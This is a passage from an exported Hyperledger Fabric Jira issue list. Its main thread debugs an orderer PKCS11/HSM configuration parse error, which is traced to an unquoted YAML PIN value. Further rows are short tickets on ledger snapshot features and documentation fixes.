LocalMSPID:myMSP Profile:map[Address:0.0.0.0:6060 Enabled:false] SystemChannel:<nil> TLS:map[Certificate:tls/server.crt ClientAuthRequired:false ClientRootCAs:<nil> Enabled:false PrivateKey:tls/server.key RootCAs:[tls/ca.crt]]] kafka:map[Retry:map[Consumer:map[RetryBackoff:2s] LongInterval:5m LongTotal:12h Metadata:map[RetryBackoff:250ms RetryMax:3] NetworkTimeouts:map[DialTimeout:10s ReadTimeout:10s WriteTimeout:10s] Producer:map[RetryBackoff:100ms RetryMax:3] ShortInterval:5s ShortTotal:10m] SASLPlain:map[Enabled:false Password:<nil> User:<nil>] TLS:map[Certificate:<nil> ClientAuthRequired:<nil> ClientRootCAs:<nil> Enabled:false PrivateKey:<nil> RootCAs:<nil>] Topic:map[ReplicationFactor:3] Verbose:false Version:<nil>] metrics:map[Provider:disabled Statsd:map[Address:127.0.0.1:8125 Network:udp Prefix:<nil> WriteInterval:30s]] operations:map[ListenAddress:127.0.0.1:8443 TLS:map[Certificate:<nil> ClientAuthRequired:false ClientRootCAs:[] Enabled:false PrivateKey:<nil> RootCAs:<nil>]] ramledger:map[HistorySize:1000]]
myOrderer    | 2020-05-15 07:41:26.670 UTC [orderer.common.server] Main -> ERRO 0d8 failed to parse config:  Error unmarshaling config into struct: 1 error(s) decoding:
myOrderer    | 
myOrderer    | * error decoding 'General.BCCSP': could not decode bcssp type: 1 error(s) decoding:
myOrderer    | 
myOrderer    | * 'PKCS11.security' expected type 'int', got unconvertible type 'string'
myOrderer exited with code 1

User friendly formated output of map

LocalMSPDir:/etc/hyperledger/msp/orderer/msp 
LocalMSPID:myMSP
BCCSP:map[
        Default:PKCS11 
        PKCS11:map[
                FileKeyStore:map[
                        KeyStore:<nil>]
                Hash:SHA2 
                Label:ForFabric 
                Library:/etc/hyperledger/fabric/HSM_lib/libsofthsm2.so 
                Pin:98765432 
                Security:256]
        SW:map[
                FileKeyStore:map[
                        KeyStore:<nil>]
                Hash:SHA2 Security:256]
]

----------------------------------------
Test 2
----------------------------------------

commented out:
- ORDERER_GENERAL_BCCSP_PKCS11_SECURITY

Output of myOrderer during start:

map[consensus:map[SnapDir:/var/hyperledger/production/orderer/etcdraft/snapshot WALDir:/var/hyperledger/production/orderer/etcdraft/wal] debug:map[BroadcastTraceDir:<nil> DeliverTraceDir:<nil>] fileledger:map[Location:/var/hyperledger/production/orderer Prefix:hyperledger-fabric-ordererledger] general:map[Authentication:map[NoExpirationChecks:<nil> TimeWindow:15m] BCCSP:map[Default:PKCS11 PKCS11:map[FileKeyStore:map[KeyStore:<nil>] Hash:SHA2 Label:ForFabric Library:/etc/hyperledger/fabric/HSM_lib/libsofthsm2.so Pin:98765432 Security:<nil>] SW:map[FileKeyStore:map[KeyStore:<nil>] Hash:SHA2 Security:256]] Cluster:map[CertExpirationWarningThreshold:<nil> ClientCertificate:<nil> ClientPrivateKey:<nil> DialTimeout:<nil> ListenAddress:<nil> ListenPort:<nil> RPCTimeout:<nil> ReplicationBackgroundRefreshInterval:<nil> ReplicationBufferSize:<nil> ReplicationMaxRetries:<nil> ReplicationPullTimeout:<nil> ReplicationRetryTimeout:<nil> RootCAs:<nil> SendBufferSize:10 ServerCertificate:<nil> ServerPrivateKey:<nil> TLSHandshakeTimeShift:<nil>] ConnectionTimeout:<nil> GenesisFile:/etc/hyperledger/configtx/genesis.block GenesisMethod:file GenesisProfile:SampleInsecureSolo Keepalive:map[ServerInterval:7200s ServerMinInterval:60s ServerTimeout:20s] LedgerType:file ListenAddress:0.0.0.0 ListenPort:7050 LocalMSPDir:/etc/hyperledger/msp/orderer/msp LocalMSPID:myMSP Profile:map[Address:0.0.0.0:6060 Enabled:false] SystemChannel:<nil> TLS:map[Certificate:tls/server.crt ClientAuthRequired:false ClientRootCAs:<nil> Enabled:false PrivateKey:tls/server.key RootCAs:[tls/ca.crt]]] kafka:map[Retry:map[Consumer:map[RetryBackoff:2s] LongInterval:5m LongTotal:12h Metadata:map[RetryBackoff:250ms RetryMax:3] NetworkTimeouts:map[DialTimeout:10s ReadTimeout:10s WriteTimeout:10s] Producer:map[RetryBackoff:100ms RetryMax:3] ShortInterval:5s ShortTotal:10m] SASLPlain:map[Enabled:false Password:<nil> User:<nil>] TLS:map[Certificate:<nil> ClientAuthRequired:<nil> ClientRootCAs:<nil> Enabled:false PrivateKey:<nil> RootCAs:<nil>] Topic:map[ReplicationFactor:3] Verbose:false Version:<nil>] metrics:map[Provider:disabled Statsd:map[Address:127.0.0.1:8125 Network:udp Prefix:<nil> WriteInterval:30s]] operations:map[ListenAddress:127.0.0.1:8443 TLS:map[Certificate:<nil> ClientAuthRequired:false ClientRootCAs:[] Enabled:false PrivateKey:<nil> RootCAs:<nil>]] ramledger:map[HistorySize:1000]]
myOrderer    | 2020-05-15 08:12:18.267 UTC [localconfig] completeInitialization -> INFO 0d8 Kafka.Version unset, setting to 0.10.2.0
myOrderer    | 2020-05-15 08:12:18.285 UTC [orderer.common.server] initializeLocalMsp -> FATA 0d9 Failed to initialize local MSP: could not initialize BCCSP Factories: Failed initializing PKCS11.BCCSP: Could not initialize BCCSP PKCS11 [Failed to initialize software key store: An invalid KeyStore path provided. Path cannot be an empty string.]
myOrderer exited with code 1

User friendly formated output of map:

LocalMSPDir:/etc/hyperledger/msp/orderer/msp 
LocalMSPID:myMSP
BCCSP:map[
        Default:PKCS11 
        PKCS11:map[
                FileKeyStore:map[
                        KeyStore:<nil>] 
                Hash:SHA2 
                Label:ForFabric 
                Library:/etc/hyperledger/fabric/HSM_lib/libsofthsm2.so 
                Pin:98765432 
                Security:<nil>] 	<== default
        SW:map[
                FileKeyStore:map[
                KeyStore:<nil>] 
                        Hash:SHA2 Security:256]
] 

----------------------------------------
Test 3
----------------------------------------

docu: LocalMSPDir is where to find the private crypto material needed by the orderer

The LocalMSPDir is not used, when the prvKeys are in the HSM. Hyperledger should only use the prvKeys to sign, but has no access to them!
 
commented out:
- ORDERER_GENERAL_BCCSP_PKCS11_SECURITY
- ORDERER_GENERAL_LOCALMSPDIR=/etc/hyperledger/msp/orderer/msp

myOrderer    | 2020-05-15 08:35:36.794 UTC [viperutil] EnhancedExactUnmarshal -> DEBU 0d7 map[consensus:map[SnapDir:/var/hyperledger/production/orderer/etcdraft/snapshot WALDir:/var/hyperledger/production/orderer/etcdraft/wal] debug:map[BroadcastTraceDir:<nil> DeliverTraceDir:<nil>] fileledger:map[Location:/var/hyperledger/production/orderer Prefix:hyperledger-fabric-ordererledger] general:map[Authentication:map[NoExpirationChecks:<nil> TimeWindow:15m] BCCSP:map[Default:PKCS11 PKCS11:map[FileKeyStore:map[KeyStore:<nil>] Hash:SHA2 Label:ForFabric Library:/etc/hyperledger/fabric/HSM_lib/libsofthsm2.so Pin:98765432 Security:<nil>] SW:map[FileKeyStore:map[KeyStore:<nil>] Hash:SHA2 Security:256]] Cluster:map[CertExpirationWarningThreshold:<nil> ClientCertificate:<nil> ClientPrivateKey:<nil> DialTimeout:<nil> ListenAddress:<nil> ListenPort:<nil> RPCTimeout:<nil> ReplicationBackgroundRefreshInterval:<nil> ReplicationBufferSize:<nil> ReplicationMaxRetries:<nil> ReplicationPullTimeout:<nil> ReplicationRetryTimeout:<nil> RootCAs:<nil> SendBufferSize:10 ServerCertificate:<nil> ServerPrivateKey:<nil> TLSHandshakeTimeShift:<nil>] ConnectionTimeout:<nil> GenesisFile:/etc/hyperledger/configtx/genesis.block GenesisMethod:file GenesisProfile:SampleInsecureSolo Keepalive:map[ServerInterval:7200s ServerMinInterval:60s ServerTimeout:20s] LedgerType:file ListenAddress:0.0.0.0 ListenPort:7050 LocalMSPDir:msp LocalMSPID:myMSP Profile:map[Address:0.0.0.0:6060 Enabled:false] SystemChannel:<nil> TLS:map[Certificate:tls/server.crt ClientAuthRequired:false ClientRootCAs:<nil> Enabled:false PrivateKey:tls/server.key RootCAs:[tls/ca.crt]]] kafka:map[Retry:map[Consumer:map[RetryBackoff:2s] LongInterval:5m LongTotal:12h Metadata:map[RetryBackoff:250ms RetryMax:3] NetworkTimeouts:map[DialTimeout:10s ReadTimeout:10s WriteTimeout:10s] Producer:map[RetryBackoff:100ms RetryMax:3] ShortInterval:5s ShortTotal:10m] SASLPlain:map[Enabled:false Password:<nil> User:<nil>] TLS:map[Certificate:<nil> ClientAuthRequired:<nil> ClientRootCAs:<nil> Enabled:false PrivateKey:<nil> RootCAs:<nil>] Topic:map[ReplicationFactor:3] Verbose:false Version:<nil>] metrics:map[Provider:disabled Statsd:map[Address:127.0.0.1:8125 Network:udp Prefix:<nil> WriteInterval:30s]] operations:map[ListenAddress:127.0.0.1:8443 TLS:map[Certificate:<nil> ClientAuthRequired:false ClientRootCAs:[] Enabled:false PrivateKey:<nil> RootCAs:<nil>]] ramledger:map[HistorySize:1000]]
myOrderer    | 2020-05-15 08:35:36.797 UTC [localconfig] completeInitialization -> INFO 0d8 Kafka.Version unset, setting to 0.10.2.0
myOrderer    | 2020-05-15 08:35:36.798 UTC [orderer.common.server] initializeLocalMsp -> FATA 0d9 Failed to initialize local MSP: could not initialize BCCSP Factories: Failed initializing PKCS11.BCCSP: Could not initialize BCCSP PKCS11 [Failed to initialize software key store: An invalid KeyStore path provided. Path cannot be an empty string.]
myOrderer exited with code 1

LocalMSPDir:msp 	<== default
LocalMSPID:myMSP
BCCSP:map[
        Default:PKCS11 
        PKCS11:map[
                FileKeyStore:map[
                        KeyStore:<nil>] 
                Hash:SHA2 
                Label:ForFabric 
                Library:/etc/hyperledger/fabric/HSM_lib/libsofthsm2.so 
                Pin:98765432 
                Security:<nil>] 
        SW:map[
                FileKeyStore:map[
                        KeyStore:<nil>] 
                        Hash:SHA2 Security:256]
]
",,Unset,,,,,,Unset,,Unset,,(Please add usage information),InRu,sykesm,tsharris,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"19/May/20 6:13 PM;InRu;I've done an additional test:

1. I modified the ""default"" orderer.yaml in ...hyperledger/fabric/sampleconfig
2. I rebuild the Orderer Docker Image
   GO_TAGS=pkcs11 make orderer-docker
3. I comment out the PKCS#11 stuff (environment) from my own myOrderer.yaml (as in Test 1 ..3)

----------------------------------------
Test 4
----------------------------------------
Modified ""default"" orderer.yaml in ...hyperledger/fabric/sampleconfig:
BCCSP:
    Default: PKCS11
    PKCS11:
        Library: /etc/hyperledger/fabric/HSM_lib/libsofthsm2.so
        Label: ForFabric
        Pin: 98765432
        Hash: SHA2
        Security: 256
        Immutable: false

Configuration of my own myOrderer.yaml:
services:
  myOrderer: 
    container_name: myOrderer 
    image: ""hyperledger/fabric-orderer:${IMAGE_TAG}""
    environment:
      -- SOFTHSM2_CONF=/etc/hyperledger/fabric/HSM_config/softhsm2.conf
      -- FABRIC_LOGGING_SPEC=debug
      -- ORDERER_GENERAL_LISTENADDRESS=0.0.0.0
      -- ORDERER_GENERAL_GENESISMETHOD=file
      -- ORDERER_GENERAL_GENESISFILE=/etc/hyperledger/configtx/genesis.block
      -- ORDERER_GENERAL_LOCALMSPID=myMSP
      -- ORDERER_GENERAL_LOCALMSPDIR=/etc/hyperledger/msp/orderer/msp

Output of myOrderer during start
myOrderer    | 2020-05-19 08:03:28.045 UTC [viperutil] EnhancedExactUnmarshal -> DEBU 0ce map[consensus:map[SnapDir:/var/hyperledger/production/orderer/etcdraft/snapshot WALDir:/var/hyperledger/production/orderer/etcdraft/wal] debug:map[BroadcastTraceDir:<nil> DeliverTraceDir:<nil>] fileledger:map[Location:/var/hyperledger/production/orderer Prefix:hyperledger-fabric-ordererledger] general:map[Authentication:map[NoExpirationChecks:<nil> TimeWindow:15m] BCCSP:map[Default:PKCS11 PKCS11:map[Hash:SHA2 Immutable:false Label:ForFabric Library:/etc/hyperledger/fabric/HSM_lib/libsofthsm2.so Pin:98765432 Security:256]] Cluster:map[CertExpirationWarningThreshold:<nil> ClientCertificate:<nil> ClientPrivateKey:<nil> DialTimeout:<nil> ListenAddress:<nil> ListenPort:<nil> RPCTimeout:<nil> ReplicationBackgroundRefreshInterval:<nil> ReplicationBufferSize:<nil> ReplicationMaxRetries:<nil> ReplicationPullTimeout:<nil> ReplicationRetryTimeout:<nil> RootCAs:<nil> SendBufferSize:10 ServerCertificate:<nil> ServerPrivateKey:<nil> TLSHandshakeTimeShift:<nil>] ConnectionTimeout:<nil> GenesisFile:/etc/hyperledger/configtx/genesis.block GenesisMethod:file GenesisProfile:SampleInsecureSolo Keepalive:map[ServerInterval:7200s ServerMinInterval:60s ServerTimeout:20s] LedgerType:file ListenAddress:0.0.0.0 ListenPort:7050 LocalMSPDir:/etc/hyperledger/msp/orderer/msp LocalMSPID:MyMSP Profile:map[Address:0.0.0.0:6060 Enabled:false] SystemChannel:<nil> TLS:map[Certificate:tls/server.crt ClientAuthRequired:false ClientRootCAs:<nil> Enabled:false PrivateKey:tls/server.key RootCAs:[tls/ca.crt]]] kafka:map[Retry:map[Consumer:map[RetryBackoff:2s] LongInterval:5m LongTotal:12h Metadata:map[RetryBackoff:250ms RetryMax:3] NetworkTimeouts:map[DialTimeout:10s ReadTimeout:10s WriteTimeout:10s] Producer:map[RetryBackoff:100ms RetryMax:3] ShortInterval:5s ShortTotal:10m] SASLPlain:map[Enabled:false Password:<nil> User:<nil>] TLS:map[Certificate:<nil> ClientAuthRequired:<nil> ClientRootCAs:<nil> Enabled:false PrivateKey:<nil> RootCAs:<nil>] Topic:map[ReplicationFactor:3] Verbose:false Version:<nil>] metrics:map[Provider:disabled Statsd:map[Address:127.0.0.1:8125 Network:udp Prefix:<nil> WriteInterval:30s]] operations:map[ListenAddress:127.0.0.1:8443 TLS:map[Certificate:<nil> ClientAuthRequired:false ClientRootCAs:[] Enabled:false PrivateKey:<nil> RootCAs:<nil>]] ramledger:map[HistorySize:1000]]
myOrderer    | 2020-05-19 08:03:28.052 UTC [orderer.common.server] Main -> ERRO 0cf failed to parse config:  Error unmarshaling config into struct: 1 error(s) decoding:
myOrderer    | 
myOrderer    | * error decoding 'General.BCCSP': could not decode bcssp type: 1 error(s) decoding:
myOrderer    | 
myOrderer    | * 'PKCS11.pin' expected type 'string', got unconvertible type 'int'
myOrderer exited with code 1

User friendly formated output of map:
LocalMSPDir:/etc/hyperledger/msp/orderer/msp 
LocalMSPID:MyMSP 
BCCSP:map[
    Default:PKCS11 
    PKCS11:map[
        Hash:SHA2 
        Immutable:false 
        Label:ForFabric 
        Library:/etc/hyperledger/fabric/HSM_lib/libsofthsm2.so 
        Pin:98765432 
        Security:256]]
;;;","26/May/20 9:00 PM;InRu;Result of further analysis:
The problem is, that during unmashaling the type of the PKCS11.pin is set to int - but the following decoder run expects a string. 

'PKCS11.pin' expected type 'string', got unconvertible type 'int'

Start of Orderers:
myOrderer    | 2020-05-26 09:22:09.924 UTC [viperutil] unmarshalJSON -> DEBU 06a Unmarshal JSON: value is not a string: 98765432
myOrderer    | 2020-05-26 09:22:09.924 UTC [viperutil] getKeysRecursively -> DEBU 06b Found real value for general.BCCSP.PKCS11.Pin setting to int 98765432

Output of my code instrumentation:
myOrderer    | decodeString() - name = PKCS11.pin
myOrderer    | decodeString() - dataVal = %!s(int=98765432)
myOrderer    | decodeString() - unknown dataKind = int
myOrderer    | decodeString() - PKCS11.pin not converted

---------------------------------------
Fix/correction:
For the test the ""default"" orderer.yaml in ...hyperledger/fabric/sampleconfig was changed:

PKCS11:
    # Location of the PKCS11 module library
    Library: /etc/hyperledger/fabric/HSM_lib/libsofthsm2.so
    # Token Label
    Label: ForFabric
    # User PIN
    Pin: ""98765432""         <== now a String !!!
    Hash: SHA2
    Security: 256
    Immutable: false

Start des Orderers:
orderer.unibw.de    | 2020-05-26 09:46:43.534 UTC [viperutil] unmarshalJSON -> DEBU 059 Unmarshal JSON: value cannot be unmarshalled: json: cannot unmarshal number into Go value of type map[string]string
orderer.unibw.de    | 2020-05-26 09:46:43.534 UTC [viperutil] getKeysRecursively -> DEBU 05a Found real value for general.BCCSP.PKCS11.Pin setting to string 98765432

Die Instrumentierung des Codes brachte folgende Ausgabe:
orderer.unibw.de    | decodeString() - name = PKCS11.pin
orderer.unibw.de    | decodeString() - dataVal = 98765432
orderer.unibw.de    | decodeString() - dataKind = string

---------------------------------------
Result/Summary:
Change the doc or the code to correct the misbehavior!
;;;","30/May/20 2:08 AM;sykesm;As you’ve observed, {{orderer.yaml}} is a {{yaml}} document and in our configuration model, the pin is typed as a {{string}} and the security field is an {{int}}. When you don’t quote a numeric value in yaml, it is treated as a number instead of a string. (The same thing happens with boolean values.)

{code}
type PKCS11Opts struct {                                                                                                   
  // Default algorithms when not specified (Deprecated?)                                                                   
  SecLevel   int    `mapstructure:""security"" json:""security""`                                                              
  HashFamily string `mapstructure:""hash"" json:""hash""`                                                                      
                                                                                                                           
  // Keystore options                                                                                                      
  Ephemeral bool `mapstructure:""tempkeys,omitempty"" json:""tempkeys,omitempty""`                                             
                                                                                                                           
  // PKCS11 options                                                                                                        
  Library    string `mapstructure:""library"" json:""library""`                                                                
  Label      string `mapstructure:""label"" json:""label""`                                                                    
  Pin        string `mapstructure:""pin"" json:""pin""`                                                                        
  SoftVerify bool   `mapstructure:""softwareverify,omitempty"" json:""softwareverify,omitempty""`                              
  Immutable  bool   `mapstructure:""immutable,omitempty"" json:""immutable,omitempty""`                                        
} 
{code}

From what I can tell, the examples in the documentation should be quoting the pin.

The SecLevel field (named “security” in the configuration document) is a different story. If setting the environment variable causes a problem, that’s a bug in the code that needs to be addressed.

I’d also suggest that a pull request is often the easiest way to “Change the doc or the code to correct the misbehavior!” and, in general, we welcome such changes.;;;","30/May/20 4:49 AM;tsharris;[https://github.com/hyperledger/fabric/pull/1353];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enable Couchdb based statedb impl for scanning for snapshot files,FAB-17901,45081,44705,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,manish-sethi,manish-sethi,16/May/20 12:36 AM,08/Jun/20 10:50 PM,28/Oct/23 3:10 AM,08/Jun/20 10:50 PM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"- Implement the function `GetFullScanIterator` (https://github.com/hyperledger/fabric/blob/9715155109cd7992c0d4d7417b97dfb9d210c4da/core/ledger/kvledger/txmgmt/statedb/statedb.go#L73) in `couchstatedb`.

- The `FullScanIterator` returns the data in the lexical sort order of <namespace, key>",,manish-sethi,,,,,,,,,,,,,,,,,,,,,FAB-17793,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c3f:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"08/Jun/20 10:49 PM;manish-sethi;https://github.com/hyperledger/fabric/pull/1348;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Generate snapshot files for statedb,FAB-17902,45082,44705,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,manish-sethi,manish-sethi,16/May/20 12:48 AM,01/Jun/20 9:30 AM,28/Oct/23 3:10 AM,01/Jun/20 9:30 AM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"- Implement a function in `privacyenabledstate.DB` (https://github.com/hyperledger/fabric/blob/9715155109cd7992c0d4d7417b97dfb9d210c4da/core/ledger/kvledger/txmgmt/privacyenabledstate/db.go#L114) to generate snapshot files for the statedb contents for a channel

- The function leverages the `statedb.FullScanIterator` (https://github.com/hyperledger/fabric/blob/9715155109cd7992c0d4d7417b97dfb9d210c4da/core/ledger/kvledger/txmgmt/statedb/statedb.go#L97) provided by the underlying statedb implementation
- The function generates separate files for the public state and the private state hashes
- The function also returns the hashes for the files contents
- The function skips over and does not include the private state",,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c3n:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"20/May/20 2:32 PM;manish-sethi; https://github.com/hyperledger/fabric/pull/1297;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Generate snapshot files for collection config history,FAB-17903,45083,44705,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Senthil1,manish-sethi,manish-sethi,16/May/20 1:31 AM,21/May/20 12:18 AM,28/Oct/23 3:10 AM,21/May/20 12:18 AM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"- Implement a function in collection config history db (https://github.com/hyperledger/fabric/blob/9715155109cd7992c0d4d7417b97dfb9d210c4da/core/ledger/confighistory/db_helper.go#L37) for generating the snapshot files.

File formats in brief:
- The data file contains a series of tuples `<blockNum, serializedBytes for proto message CollectionConfigPackage>`, sorted by <namespace, blockNum>
- The metadata file contains a series of tuples `<namespace, number of tuples in the data file that belong to the name>`, sorted by lexical order on the namespace",,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c3v:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement API createSnapshot in kvledger,FAB-17904,45084,44705,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,manish-sethi,manish-sethi,manish-sethi,16/May/20 1:45 AM,08/Jun/20 10:46 PM,28/Oct/23 3:10 AM,08/Jun/20 10:46 PM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"Implement an API {{createSnapshot}} in kvledger. In the implementaion
 - Invoke the sub-components {{statedb, blockstorage, and collection config history db}} to generate the snapshot files in a temporary folder {{snapshots/underProcessing}}
 - Generate the final snapshot metadata file in human readable JSON format
 - Rename the temporary folder to the final name - {{snapshots/completed/channelName/height}}",,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c43:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"01/Jun/20 9:38 AM;manish-sethi;https://github.com/hyperledger/fabric/pull/1356;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Check failed when I run make basic-checks docker-test-prereqs,FAB-17905,45085,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,KerwinSun,KerwinSun,16/May/20 2:19 AM,03/Jun/20 12:36 PM,28/Oct/23 3:10 AM,03/Jun/20 12:36 PM,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,Documentation,,,,,"error message:

make: *** No rule to make target 'docker-test-prereqs'. Stop

When I followed the document about build dev environment and ran this cmd `make basic-checks docker-test-prereqs`, it failed.

Then I checked the makefile, it didn't have docker-test-prereqs this argument.

Is it outdated? Should we remove this `docker-test-prereqs`?",,btl5037,KerwinSun,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c4b:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,KerwinSun,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"19/May/20 1:47 AM;btl5037;We are looking into this, its not outdated, it was introduced into the docs last month, just not sure where it came from.

We will get it corrected with the correct make target and post the correct command here for you;;;","19/May/20 2:10 AM;btl5037;This was intended to be a new target that runs a subset of the integration tests to verify functionality (since regular integrations tests take 1+ hours). The Make target was missed when the change was added.

We are going to fix it by adding the target shortly. The doc is correct.;;;","03/Jun/20 12:36 PM;btl5037;The documentation was updated and the issues corrected;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add functions for snapshots management in kvledger,FAB-17906,45086,44705,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,manish-sethi,manish-sethi,16/May/20 3:43 AM,03/Aug/20 9:47 PM,28/Oct/23 3:10 AM,03/Aug/20 9:47 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"In the {{kvledger}} add the following APIs as mentioned in the RFC. 

Note that in the RFC, the scope of the APIs is mentioned at the higher level and hence only limited functionality would be implemented at the {{kvledger}} level. For instance, authorization checks etc. would be maintain at the peer level in a separate task.

* {{SubmitSnapshotRequest (height uint64, error)}}
** Accept a valid request for snapshot generation and persists the request in a leveldb instance
** Return error if the ledger height specified in the request has already passed
* {{PendingSnapshotRequests () ([]height, error)}}
** Returns the pending (or under processing) requests for snapshots
* {{CancelSnapshotRequest (height uint64) error}}
** Cancels the previously submitted request
** Returns an error if no such pending request
* {{ListSnapshots() ([]*SnapshotInfo, error)}}
** Define SnapshotInfo proto in fabric-protos repo (details in the RFC)
** Returns the information about available snapshots
* {{DeleteSnapshot (height uint64) error}}
** Delete the snapshot files except the metadata file
** Returns an error if no such snapshot

In addition make the following changes in {{kvledger}}
* On startup, delete the folder {{snapshots/under_processing}} to discard any incomplete snapshots that may be present due to a possible server crash
* Start tracking the next snapshot request to be processed (pending request with the shortest height)
* Start tracking the height of the ledger such that upon reaching the ledger height specified in the snapshot request, pause further block commits and invoke the API {{createSnapshot}} on kvledger (FAB-17904)",,manish-sethi,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01c4j:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,wenjian,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Jul/20 10:07 AM;wenjian;The implementation of this task has been organized and split into the following PRs:

[https://github.com/hyperledger/fabric/pull/1594]

[https://github.com/hyperledger/fabric/pull/1629]

[https://github.com/hyperledger/fabric/pull/1638]

[https://github.com/hyperledger/fabric/pull/1657];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
_lifecycle doesn't attempt rebuild of installed chaincode after failure,FAB-17907,45087,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,16/May/20 4:34 AM,28/May/20 11:05 PM,28/Oct/23 3:10 AM,28/May/20 11:05 PM,,,,,,,,,,v2.1.1,v2.2.0,,,fabric-peer,,,,,,,,,0,operator,,,,,"*2nd issue*

However, there is a second issue with new lifecycle. Even when the build issue is resolved (in my case I kept the peer up, tagged ccenv:latest to ccenv:latest2, did not change core.yaml settings), the next installation attempt still fails with the same error message, even though ccenv:latest2 now exists on the peer machine:
{code:java}
 $ peer lifecycle chaincode install marbles.tar.gz

Error: chaincode install failed with status: 500 - failed to invoke backing implementation of 'InstallChaincode': could not build chaincode: docker build failed: docker image build failed: docker build failed: Failed to pull hyperledger/fabric-ccenv:latest2: API error (404): manifest for hyperledger/fabric-ccenv:latest2 not found: manifest unknown: manifest unknown
{code}
